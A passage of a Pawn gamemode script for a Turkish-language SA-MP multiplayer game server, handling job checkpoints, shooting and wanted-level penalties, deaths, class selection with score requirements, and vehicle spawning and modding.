			OnPlayerEnterCopCheckpoint(playerid); // Process the checkpoint (load or unload)
		case ClassBanka: // G class
			Banka_OnPlayerEnterCheckpoint(playerid); // Process the checkpoint (load or unload)
		case ClassFire: // G class
			Fire_OnPlayerEnterCheckpoint(playerid); // Process the checkpoint (load or unload)
		case ClassRoadWorker: // Roadworker class
		{
			// Only end the mission when doing "repair-speedcamera" jobtype (checkpoint is the base of the roadworker)
			if (APlayerData[playerid][JobID] == 1) // Repairing speedcamera's
			{
				GameTextForPlayer(playerid, TXT_RoadworkerMissionPassed, 3000, 4); // Show a message to let the player know he finished his job
				Roadworker_EndJob(playerid); // End the current mission
			}
			if (APlayerData[playerid][JobID] == 2) // Towing broken vehicle to shredder
                Roadworker_EnterCheckpoint(playerid);
		}
        case ClassPboy: // Pizza Boy class
			Pboy_OnPlayerEnterCheckpoint(playerid);
		case ClassKargocu:
			OnPlayerEnterKargoCheckpoint(playerid);
	}

	return 1;
}



// This callback gets called when a player enters a race-checkpoint
public OnPlayerEnterRaceCheckpoint(playerid)
{
	// Check the player's class
	switch (APlayerData[playerid][PlayerClass])
	{
	    case ClassDolmusDriver: // BusDriver class
      		Dolmus_EnterRaceCheckpoint(playerid); // Process the checkpoint
		case ClassRoadWorker: // Roadworker class
			Roadworker_EnterRaceCheckpoint(playerid);
	}

	return 1;
}



// This callback gets called whenever a player dies
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	/*new szString[144];
    format(szString, sizeof(szString), "Weapon %i fired. hittype: %i   hitid: %i   pos: %f, %f, %f", weaponid, hittype, hitid, fX, fY, fZ);
    SendClientMessage(playerid, -1, szString);*/
    if(APlayerData[playerid][PlayerLevel] <= 3)
	{
	    if(SilahIzni[playerid] != 1)
		{
	 			if(g_Flags[playerid] & e_Play)
		 	    {
		 	    }else if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
		 				 ResetPlayerWeapons(playerid);
				}
		}
	}
	if(APlayerData[playerid][PlayerClass] != ClassFBY && APlayerData[playerid][PlayerClass] != ClassPolice)
	{
	    new Name[MAX_PLAYER_NAME], Msg[1024];
	    if(APlayerData[hitid][PlayerClass] == ClassFBY || APlayerData[hitid][PlayerClass] == ClassPolice)
	    {
	        if(SilahUyariM[playerid] == 0)
	        {
		        SilahUyariM[playerid] = 1;
				GetPlayerName(playerid, Name, sizeof(Name));
			    SendClientMessage(playerid, -1, "{FF0000}Bir memura ateþ ettiðin için aranma seviyen +3 arttý.");
			    format(Msg, 128, "{00FF00}MERKEZ : {FFFF00}%s{00FF00} adlý þahýsýn memura ateþ açtýðý ihbarý geldi direk olaya müdehale saðlayýnýz...", Name);
				Police_SendMessage(Msg);
				APlayerData[playerid][PlayerWanted] += 3;
			}
		}else
		if(SilahUyari[playerid] == 0 && PlayerPBing[playerid] == false)
		{
		    SilahUyari[playerid] = 1;
		    SendClientMessage(playerid, -1, "{FF0000}Bir sivile ateþ ettin tekrarladýðýn takdirde aranma seviyen artacak.");
		}else if(SilahUyari[playerid] == 1 && PlayerPBing[playerid] == false){
		    SilahUyari[playerid] = 2;
			GetPlayerName(playerid, Name, sizeof(Name));
		    SendClientMessage(playerid, -1, "{FF0000}Bir sivile ateþ ettiðin için aranma seviyen +2 arttý.");
		    format(Msg, 128, "{00FF00}MERKEZ : {FFFF00}%s{00FF00} adlý þahýsýn sivile ateþ açtýðý ihbarý geldi direk olay yerine intikal ediniz...", Name);
			Police_SendMessage(Msg);
			APlayerData[playerid][PlayerWanted] += 2;
		}else if(SilahUyari[playerid] == 2 && PlayerPBing[playerid] == false){
		    SilahUyari[playerid] = -1;
			GetPlayerName(playerid, Name, sizeof(Name));
		    SendClientMessage(playerid, -1, "{FF0000}Bir sivile ateþ ettiðin için aranma seviyen +1 arttý.");
		    format(Msg, 128, "{00FF00}MERKEZ : {FFFF00}%s{00FF00} adlý þahýsýn sivile ateþ açtýðý ihbarý tekrardan geldi olaya aciliyet gösteriniz...", Name);
			Police_SendMessage(Msg);
			APlayerData[playerid][PlayerWanted] += 1;
		}
	}
	if(hittype == 1)
	{
	    if(APlayerData[hitid][PlayerWanted] == 0 && PlayerPBing[playerid] == false)
	    {
			// Check if the player's admin-level is at least 1
			if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] == 0 && Root[playerid] == 0)
			{
				if(g_Flags[playerid] & e_Play)
				{
 				}else{
		    		new Float:x, Float:y, Float:z;
		    		GetPlayerPos(playerid, x, y, z);
		    		SetPlayerPos(playerid,x,y,z+2);
		    		SetPlayerHealth(hitid,70);
	        		SendClientMessage(playerid,-1,"DIKKAT !!! SUCSUZ BIRINE ATES EDIYORSUN !!! -5 SKOR ! -10 K");
					APlayerData[playerid][PlayerWanted] = 3;
					RewardPlayer(playerid,-10000,-5);
					PlayerPlaySound(playerid,1132,x,y,z);
					//RewardPlayer(playerid,1000,1);
				}
			}
	    }
     }

    return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
   /* // Öldükten sonra açlýkla ilgili herþeyi sýfýrlayýp tekrar yaratýyoruz.
 	pAclik[playerid] = 100;
    aclikAzalt(playerid, 1);
	if(pAclikZaman[playerid] != -1) KillTimer(pAclikZaman[playerid]);
	pAclikZaman[playerid] = SetTimerEx("pAclikZaman_f", ACLIK_KONTROL*1000, false, "i", playerid);

    pSusuzluk[playerid] = 100;
    susuzlukAzalt(playerid, 1);
	if(pSusuzlukZaman[playerid] != -1) KillTimer(pSusuzlukZaman[playerid]);
	pSusuzlukZaman[playerid] = SetTimerEx("pSusuzlukZaman_f", SUSUZLUK_KONTROL*1000, false, "i", playerid);
*/
	
	// PaintBall
 	if(PlayerPBing[killerid] == true)
	{
		new string[128],string2[128],pName[MAX_PLAYER_NAME];
		GetPlayerName(killerid,pName,sizeof(pName));
		PlayerPBKills[killerid]++;
		format(string2,sizeof(string2),"Vurduðun kiþi sayýsý: "COL_RED" %d",PlayerPBKills[killerid]);
		SendClientMessage(killerid,COLOR_WHITE,string2);
		SetPlayerTeam(playerid, playerid+1000);
		SetPlayerTeam(killerid, killerid+1000);
		if(PlayerPBKills[killerid] > PBLeaderKills)
		{
			PBLeaderKills = PlayerPBKills[killerid];
			PBLeaderid = killerid;
			format(string,sizeof(string),COL_RED"%s(%d) "COL_WHITE"isimli kiþi "COL_RED"%d "COL_WHITE"kiþiyi öldürmüþ, ve senden önde!",pName,killerid,PlayerPBKills[killerid]);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(PlayerPBing[i] == true)
				{
					SendClientMessage(i,COLOR_WHITE,string);
				}
			}
		}
	}
	
    // Karavan Sistemi
	pKaravan[playerid] = -1;

	new LogiTech[100];
	if(killerid == INVALID_PLAYER_ID)
	{
	    format(LogiTech, 100, "%s öldü.", GetName(playerid));
	}else{
	    format(LogiTech, 100, "%s %s'i öldürdü. Oldurme Sekli: %d", GetName(killerid), GetName(playerid), reason);

	 	if(SilahIzni[killerid] != 1)
		{
	 		 	   if(g_Flags[killerid] & e_Play)
	  		 	  	{
	  		 	  	//
			 	    }else{
			 	    if (APlayerData[killerid][PlayerClass] != ClassFBY && PlayerPBing[killerid] == false) {
			 			ResetPlayerWeapons(killerid);
			 			ResetPlayerWeapons(playerid);
						}else{ ResetPlayerWeapons(playerid); }
					}

		}
	}
	LOG(LogiTech);


	   	/*if(GetPlayerWantedLevel(playerid == 0))
    	{
			if(APlayerData[killerid][PlayerLevel] == 0 && APlayerData[killerid][PlayerDjLevel] == 0 && Root[killerid] == 0)
			{
 				if(g_Flags[killerid] & e_Play)
				{
 				}else{
		    		new Float:x, Float:y, Float:z;
		    		GetPlayerPos(killerid, x, y, z);
		    		SetPlayerPos(killerid,x,y,z+2);
		    		SetPlayerHealth(playerid,70);
	        		SendClientMessage(killerid,-1,"DIKKAT !!! SUCSUZ BIRINE ATES EDIYORSUN !!! -5 SKOR ! -10 K");
					//SetPlayerWantedLevel(killerid,3);
					//RewardPlayer(killerid,-10000,-5);
					//RewardPlayer(playerid,1000,1);
				}
			}
  		}*/


    PlayerTextDrawShow(playerid,TDEditor_PTD[playerid][0]);
	TextDrawShowForPlayer(playerid,TDEditor_TD[0]);
	TextDrawShowForPlayer(playerid,TDEditor_TD[1]);
	TextDrawShowForPlayer(playerid,TDEditor_TD[2]);

    SilahIzni[playerid] = 0;

	//kill list
	//SendDeathMessage(killerid, playerid, reason);

	//Etkinlik Sistemi
	if(g_Flags[playerid] & e_Play) {
		g_Flags[playerid] &= ~e_Play;
		SetPlayerTeam(playerid, APlayerData[playerid][PlayerClass]+1);
	}

	// Anti Flood Sistemi
	if(OlumDurdur[playerid] == 1)
	{
	    OlumSayisi[playerid]++;
	    if(OlumSayisi[playerid] == 2)
	    {
	        new Yazi[250];
	        format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Fake Kill )", GetName(playerid));
	        SendClientMessageToAll(-1, Yazi);

	        printf("[KICK] %s(%d) ( Fake Kill )", GetName(playerid), playerid);
	        SafeKick(playerid);
	        return 1;
	    }
	}else{
	    OlumSayisi[playerid] = 1;
	}

	OlumDurdur[playerid] = 1;

	/*
	new YeniOlumTick = GetTickCount();
	if(YeniOlumTick - SonOlumTick[playerid] < 2000)
	{
	    OlumSayisi[playerid]++;
	    if(OlumSayisi[playerid] == 5)
	    {
	        new Yazi[250];
	        format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Fake Kill )", GetName(playerid));
	        SendClientMessageToAll(-1, Yazi);

	        printf("[KICK] %s(%d) ( Fake Kill )", GetName(playerid), playerid);
	        SafeKick(playerid);
	        return 1;
	    }
	}else{
	    OlumSayisi[playerid] = 1;
	}
	SonOlumTick[playerid] = YeniOlumTick;
	*/

	// Setup local variables
	//new VictimName[24], KillerName[24], Msg[128];
	// Clear the missiontext
	//TextDrawSetString(APlayerData[playerid][MissionText], " ");
	// Hide the missiontext for this player (when the player is choosing a class, it's not required to show any mission-text)
	//TextDrawHideForPlayer(playerid, APlayerData[playerid][MissionText]);

	// Stop any job that may have started
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: { Trucker_EndJob(playerid); }// Stop any trucker job
 		case ClassBusDriver: { BusDriver_EndJob(playerid); }// Stop any pilot job
 		case ClassDolmusDriver: { DolmusDriver_EndJob(playerid); }// Stop any pilot job
		case ClassPilot: { Pilot_EndJob(playerid); }// Stop any pilot job
		case ClassPolice: { Police_EndJob(playerid); }// Stop any police job
		case ClassMafia: { Mafia_EndJob(playerid); }// Stop any mafia job
		case ClassRoadWorker: { Roadworker_EndJob(playerid); }
 		case ClassGemici: { Gemici_EndJob(playerid); }// Stop any pilot job
 		case ClassOduncu: { Oduncu_EndJob(playerid); }// Stop any pilot job
 		case ClassBalikci: { Balikci_EndJob(playerid); }// Stop any pilot job
 		case ClassCopcu: { StopCopcuGorev(playerid); }
 		case ClassBanka: { Banka_EndJob(playerid); }
 		case ClassFire: { Fire_EndJob(playerid); }
 		case ClassFBY: { FBY_EndJob(playerid); }
 		case ClassPboy: { Pboy_EndJob(playerid); }
	}

	// If the player is part of a convoy, kick him from it
	Convoy_Leave(playerid);

	// If another player kills you, he'll get an extra star of his wanted level
	/*if (killerid != INVALID_PLAYER_ID)
	{
		// Increase the wanted level of the killer by one star
	   // SetPlayerWantedLevel(killerid, GetPlayerWantedLevel(killerid) + 5);
		//SetPlayerTeam(playerid, 99);
		if(GetPlayerTeam(killerid) == 99)
		{
		SetPlayerWantedLevel(killerid, 0);
  		}

		if(g_Flags[killerid] & e_Play)
		{
 		}else{
	    	// Get the name of the killed player and the killer
	    	GetPlayerName(playerid, VictimName, sizeof(VictimName));
	    	GetPlayerName(killerid, KillerName, sizeof(KillerName));
	    	// Let the killed know the police are informed about the kill
			format(Msg, 128, "{FF0000}Sen {FFFF00}%s{FF0000} adlý oyuncuyu öldürdün , Artýk Aranýyorsun Teslim Ol ( 5 YILDIZ )", VictimName);
			SendClientMessage(killerid, 0xFFFFFFFF, Msg);
			// Inform all police players about the kill
			format(Msg, 128, "{00FF00}  MERKEZ : {FFFF00}%s{00FF00} oyuncu {FFFF00}%s{00FF00} adlý oyuncuyu öldürdü , Goruldu Yerde Durdurulsun. ( 5 YILDIZ )", KillerName, VictimName);
			Police_SendMessage(Msg);
			FBY_SendMessage(Msg);
		}
	}
*/
	// Anti Teleport Sistemi
	//BirSureBakmaTamam[playerid] = 0;
	return 1;
}



// This callback gets called when the player is selecting a class (but hasn't clicked "Spawn" yet)
public OnPlayerRequestClass(playerid, classid)
{
	new guncellemeamacli[MAX_PLAYERS][128];
	
	format(guncellemeamacli[playerid], -1, GetName(playerid));
	SetPlayerName(playerid, "Duzeltme");
	SetPlayerName(playerid, guncellemeamacli[playerid]);
	if(IsPlayerNPC(playerid)) return 1;

	PlayerTextDrawHide(playerid,TDEditor_PTD[playerid][0]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[0]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[1]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[2]);

	SetPlayerInterior(playerid,17);
	SetPlayerPos(playerid,486.390991, -12.722799, 990.679687);
	SetPlayerFacingAngle(playerid, 100.0);
	SetPlayerCameraPos(playerid,480.390991, -12.722799, 1000.679687);
	SetPlayerCameraLookAt(playerid,480.390991, -12.722799, 1000.679687);

	APlayerSpawnData[playerid] = false;

	if(APlayerData[playerid][LoggedIn] == false)
	{
		// Kayýt Sistemi
		girisSure[playerid] = SetTimerEx("girisKick", 60000, false, "i", playerid);
		Oyuncu_HesapKontrol(playerid);
	}else{
	    SpawnPlayer(playerid);
	    SetCameraBehindPlayer(playerid);
	}

	return 1;
}



// This callback is called when the player attempts to spawn via class-selection
public OnPlayerRequestSpawn(playerid)
{

	//==========================================================================
	new Name[MAX_PLAYER_NAME], Msg[128];
	GetPlayerName(playerid, Name, MAX_PLAYER_NAME);
	APlayerSpawnData[playerid] = true;

	if(ReqSpawnDurdur[playerid] > 0)
	{
	    ReqSpawnSayisi[playerid] ++;
		if(ReqSpawnSayisi[playerid] == 5)
		{
		    format(Msg, 128, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( ReqSpawn Flood )", GetName(playerid));
		    SendClientMessageToAll(-1, Msg);

		    printf("[KICK] %s(%d) ( ReqSpawn Flood )", GetName(playerid), playerid);
		    SafeKick(playerid);
		    return 1;
		}
	}else{
	    ReqSpawnSayisi[playerid] = 1;
	}
	ReqSpawnDurdur[playerid] = 3;

	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver:
		{
		    SetPlayerColor(playerid, ColorClassTruckDriver);
			format(Msg, 128, "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncu ( {FFCC00}%s {FFFFFF})'týr þöförü' {FFFFFF}olarak spawn oldu!", Name,TruckerRanks[ Rank[playerid] ][RankName]);
		}
		case ClassBusDriver:
		{
		    SetPlayerColor(playerid, ColorClassBusDriver);
			format(Msg, 128, "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncu ( {FFCC00}%s {FFFFFF})'otobüs þöförü' {FFFFFF}olarak spawn oldu!", Name,BusDriverRanks[ Rank[playerid] ][RankName]);
		}
		case ClassDolmusDriver:
		{
		    SetPlayerColor(playerid, ColorClassDolmusDriver);
			format(Msg, 128, "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncu ( {FFCC00}%s{FFFFFF} )'dolmuþ þöförü' {00C98D}olarak spawn oldu!", Name,DolmusDriverRanks[ Rank[playerid] ][RankName]);
		}
		case ClassPilot:
		{
		    if (APlayerData[playerid][PlayerScore] < 200)
		    {
				SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00}Pilot olabilmek için {FFCC00}200 {FFFFFF}skor olmalýsýnýz!");
				return 0;
		    }
		    SetPlayerColor(playerid, ColorClassPilot);
			format(Msg, 128, "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncu ( {FFCC00}%s{FFFFFF} ) {FFCC00}'pilot' {FFFFFF}olarak spawn oldu!", Name,PilotRanks[ Rank[playerid] ][RankName]);
		}
		case ClassPolice:
		{
		    new NormalPlayers, PolicePlayers, bool:CanSpawnAsCop = false;
			if (PlayersBeforePolice > 0)
			{
				for (new pid; pid < MAX_PLAYERS; pid++)
				{
					if (pid != playerid)
					{
					    if (GetPlayerInterior(pid) != 14)
					    {
							if (APlayerData[pid][LoggedIn] == true)
							{
								switch (APlayerData[pid][PlayerClass])
								{
									case ClassPolice:
									    PolicePlayers++;
									case ClassTruckDriver, ClassBusDriver, ClassDolmusDriver, ClassPilot, ClassMafia, ClassRoadWorker, ClassPboy:
								    	NormalPlayers++;
								}
							}
						}
					}
				}
				if (PolicePlayers < (NormalPlayers / PlayersBeforePolice))
				    CanSpawnAsCop = true;
				else
				    CanSpawnAsCop = false;

				if (CanSpawnAsCop == false)
				{
					GameTextForPlayer(playerid, "Bu meslek dolu!\nLutfen baska meslek seciniz.", 5000, 4);
					SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Þuan bu mesleðe giremezsiniz!");
					return 0;
				}
			}

		    if (APlayerData[playerid][PlayerScore] < 1000)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Polis olabilmek için {00B3FF}1000 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }

		    if (APlayerData[playerid][PlayerWanted] > 0)
		    {
				GameTextForPlayer(playerid, "Araniyorsunuz!~n~Polis olamazsiniz!", 5000, 4);
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Aranýrken polis olamazsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassPolice);
			format(Msg, 128, "{FFCC00}» {FFCC00}%s {FFFFFF}rumuzlu oyuncu  ( {FFCC00}%s{FFFFFF} ) {FFCC00}'polis' {FFFFFF}olarak spawn oldu!", Name,PoliceRanks[ Rank[playerid] ][RankName]);
		}
		case ClassMafia:
		{
		    if (APlayerData[playerid][PlayerScore] < 100)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{{FFCC00}» {FFFFFF}Mafya üyesi olabilmek için {FFCC00}100 {FFFFFF}skor olmalýsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassMafia);
			format(Msg, 128, "{CC28DF}%s {CC28DF}rumuzlu oyuncu ( {FF0000}%s{CC28DF} ) {CC28DF}'mafya' {CC28DF}olarak spawn oldu!", Name,MafiaRanks[ Rank[playerid] ][RankName]);
		}
		case ClassRoadWorker:
		{
		    if (APlayerData[playerid][PlayerScore] < 0)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Yol iþçisi olabilmek için {00B3FF}0 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassRoadWorker);
			format(Msg, 128, "{F9FF7A}%s {F9FF7A}rumuzlu oyuncu ( {FF0000}%s{F9FF7A} ) {F9FF7A}'yol iþçisi' {F9FF7A}olarak spawn oldu!", Name,RoadWorkerRanks[ Rank[playerid] ][RankName]);
		}
		case ClassGemici:
		{
		    if (APlayerData[playerid][PlayerScore] < 700)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Gemici olabilmek için {00B3FF}700 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassGemici);
			format(Msg, 128, "{7AF0FF}%s {7AF0FF}rumuzlu oyuncu ( {FF0000}%s{7AF0FF} ) {7AF0FF}'gemici' {7AF0FF}olarak spawn oldu!", Name,GemiciRanks[ Rank[playerid] ][RankName]);
		}
		case ClassOduncu:
		{
		    if (APlayerData[playerid][PlayerScore] < 600)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Oduncu olabilmek için {00B3FF}600 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassOduncu);
			format(Msg, 128, "{439022}%s {439022}rumuzlu oyuncu ( {FF0000}%s{439022} ) {439022}'oduncu' {439022}olarak spawn oldu!", Name,OduncuRanks[ Rank[playerid] ][RankName]);
		}
		case ClassBalikci:
		{
		    if (APlayerData[playerid][PlayerScore] < 400)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Balýkçý olabilmek için {00B3FF}400 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
            SetPlayerColor(playerid, ColorClassBalikci);
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'balýkçý' {009BFF}olarak spawn oldu!", Name,BalikciRanks[ Rank[playerid] ][RankName]);
		}
		case ClassCopcu:
		{
		    if (APlayerData[playerid][PlayerScore] < 300)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Cöpcü olabilmek için {00B3FF}300 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
		    SetPlayerColor(playerid, ColorClassCopcu);
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'Copcu' {009BFF}olarak spawn oldu!", Name,CopcuRanks[ Rank[playerid] ][RankName]);
		}
		case ClassBanka:
		{
		    if (APlayerData[playerid][PlayerScore] < 1000)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Bankaci olabilmek için {00B3FF}1000 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
		    SetPlayerColor(playerid, ColorClassBanka);
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'Bankaci' {009BFF}olarak spawn oldu!", Name,BankaRanks[ Rank[playerid] ][RankName]);
		}
		case ClassFire:
		{
		    if (APlayerData[playerid][PlayerScore] < 2000)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Itfaiyeci olabilmek için {00B3FF}2000 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
		    SetPlayerColor(playerid, ColorClassFire);
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'Itfaiyeci' {009BFF}olarak spawn oldu!", Name,FireRanks[ Rank[playerid] ][RankName]);
		}
		case ClassFBY:
		{
		    if (APlayerData[playerid][PlayerScore] < 4000)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Cevik Kuvvet olabilmek için {00B3FF}4000 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'Çevik Kuvvet' {009BFF}olarak spawn oldu!", Name,FBYRanks[ Rank[playerid] ][RankName]);
		}
		case ClassPboy:
		{
		    if (APlayerData[playerid][PlayerScore] < 1500)
		    {
				SendClientMessage(playerid, 0xFFFFFFFF, "{CFCFCF}Pizzaci olabilmek için {00B3FF}1500 {CFCFCF}skor olmalýsýnýz!");
				return 0;
		    }
		    SetPlayerColor(playerid, ColorClassPboy);
			format(Msg, 128, "{009BFF}%s {009BFF}rumuzlu oyuncu ( {FF0000}%s{009BFF} ) {009BFF}'Pizzaci' {009BFF}olarak spawn oldu!", Name,PboyRanks[ Rank[playerid] ][RankName]);
		}
	}
	// Send the message to all players (who joined which class)
	SendClientMessageToAll(0xFFFFFFFF, Msg);
	if (APlayerData[playerid][PlayerLevel] > 0)
	{
		for(new i; i < 7; i++)
		{
			PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
		}
	}

    return 1;
}



// This callback gets called when a vehicle respawns at it's spawn-location (where it was created)
public OnVehicleSpawn(vehicleid)
{
    CarUpdate[vehicleid] = 0;
	// Sinyal Sistemi
	if(B_IsTrailer(vehicleid))
    {
        new veh;
        if((veh = TrailerVehicle[vehicleid]) != 0)
        {
            if(IsCarBlinking(veh))
            {
                DestroyDynamicObject(Blink[veh][1]);
                DestroyDynamicObject(Blink[veh][3]);
                Blink[veh][1] = -1;
                Blink[veh][3] = -1;
            }
        }
    }
    else DisableCarBlinking(vehicleid);
    // Araç Sahiplik Sistemi
	if(Araclar[vehicleid][AracInSHP] == true)
	{
		ChangeVehicleColor(vehicleid, AracSHP[ Araclar[vehicleid][AracSHPID] ][ASHPRenk1], AracSHP[ Araclar[vehicleid][AracSHPID] ][ASHPRenk2]);
	    Arac_LoadMod(Araclar[vehicleid][AracSHPID]);
	}else{
	    if(Araclar[vehicleid][AracStatic] == true)
	    {
 			Araclar[vehicleid][AracGR1] = Araclar[vehicleid][AracR1];
			Araclar[vehicleid][AracGR2] = Araclar[vehicleid][AracR2];
			Araclar[vehicleid][AracGPJ] = Araclar[vehicleid][AracPJ];
	    }
	}

	// Set the vehicle as not-wanted by the mafia
	AVehicleData[vehicleid][MafiaLoad] = false;
	// Also reset the fuel to maximum (only for non-owned vehicles)
	if (AVehicleData[vehicleid][Owned] == false)
		AVehicleData[vehicleid][Fuel] = MaxFuel;

	VehicleIsLocked[vehicleid] = 0;

/*	if(AVehicleData[vehicleid][Owned] == false)
	{
		new Component;
		for(new i; i < 14; i++)
		{
			Component = GetVehicleComponentInSlot(vehicleid, i);
			ChangeVehiclePaintjob(vehicleid, 3);
			if(Component != 0)
			{
				RemoveVehicleComponent(vehicleid, Component);
			}
		}
	}*/

	// Re-apply the paintjob (if any was applied)
/*	if (AVehicleData[vehicleid][PaintJob] != 0)
	{
		// Re-apply the paintjob
		ChangeVehiclePaintjob(vehicleid, AVehicleData[vehicleid][PaintJob] - 1);
	}*/

	// Also update the car-color
	//ChangeVehicleColor(vehicleid, AVehicleData[vehicleid][Color1], AVehicleData[vehicleid][Color2]);

	// Re-add all components that were installed (if they were there)
/*	for (new i; i < 14; i++)
	{
		// Remove all mods from the vehicle (all added mods applied by hackers will hopefully be removed this way when the vehicle respawns)
       	RemoveVehicleComponent(vehicleid, GetVehicleComponentInSlot(vehicleid, i));

	   	// Check if the componentslot has a valid component-id
		if (AVehicleData[vehicleid][Components][i] != 0)
	       	AddVehicleComponent(vehicleid, AVehicleData[vehicleid][Components][i]); // Add the component to the vehicle
	}*/

	// Þirket Sistemi
	if(ArabaSirket[vehicleid] != -1)
	{
	    SetVehiclePos(vehicleid, SirketAraba[ ArabaSirket[vehicleid] ][SAX], SirketAraba[ ArabaSirket[vehicleid] ][SAY], SirketAraba[ ArabaSirket[vehicleid] ][SAZ]);
	    SetVehicleZAngle(vehicleid, SirketAraba[ ArabaSirket[vehicleid] ][SARZ]);
	}


    return 1;
}



// This callback is called when the vehicle leaves a mod shop
public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	// Let the player pay $150 for changing the color (if they have been changed)
	if ((AVehicleData[vehicleid][Color1] != color1) || (AVehicleData[vehicleid][Color2] != color2))
	{
		RewardPlayer(playerid, -150, 0);
		SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Aracýnýz yeniden boyandý. Maliyet : $150");
	}

	// Save the colors
	AVehicleData[vehicleid][Color1] = color1;
	AVehicleData[vehicleid][Color2] = color2;

	// If the primary color is black, remove the paintjob
	if (color1 == 0)
		AVehicleData[vehicleid][PaintJob] = 0;

	return 1;
}



// This callback gets called when a player enters or exits a mod-shop
public OnEnterExitModShop(playerid, enterexit, interiorid)
{

	return 1;
}



// This callback gets called whenever a player mods his vehicle
public OnVehicleMod(playerid, vehicleid, componentid)
{
	// When the player changes a component of his vehicle, reduce the price of the component from the player's money
	APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] - AVehicleModPrices[componentid - 1000];

	// Store the component in the AVehicleData array
	AVehicleData[vehicleid][Components][GetVehicleComponentType(componentid)] = componentid;

     if(GetPlayerInterior(playerid) == 0 && VIP[playerid]== 0 && YVIP[playerid] == 0)
    	{
        if(Root[playerid] == 1 || modcmd[playerid] == 1)
        {
        //hic bisi
        }
		else
        {
        SafeKick(playerid);
		}
    }

	return 1;
}



// This callback gets called whenever a player VIEWS at a paintjob in a mod garage (viewing automatically applies it)
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	// Store the paintjobid for the vehicle (add 1 to the value, otherwise checking for an applied paintjob is difficult)
    AVehicleData[vehicleid][PaintJob] = paintjobid + 1;

	return 1;
}


public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
  new veh = GetPlayerVehicleID(playerid);
  new Float:health;
  GetVehicleHealth(veh, health);
  if(IsPlayerInAnyVehicle(playerid))
  {
  if(health < 600)
  {
	  new engine, lights, alarm, doors, bonnet, boot, objective;
	  GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
	  SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
	  SendClientMessage(playerid, COLOR_RED,"* Araç stop etti.!");
	  MotorMOD[veh] = 0;
  }
  }
  return 1;
  }
// This callback gets called whenever a player enters a vehicle
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	// Sabit Hýz Metin ile Sabah sabah delirmeceler
	SabitHiz[playerid] = 0.0;

	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 407)
    {
		SendClientMessage(playerid, COLOR_RED, "{FFCC00}» {FFFFFF}Baslamak Icýn {FFCC00}/itfaiye {FFFFFF}yazabilirsiniz.");
    }

	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Can Güvenliginiz icin {FFCC00}/Kemer{FFFFFF}'inizi Takmayi unutmayiniz.");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Arac Modifiye Ýcin : {FFCC00} /modifiye ");

    if(otovites[playerid] == 0)
	{
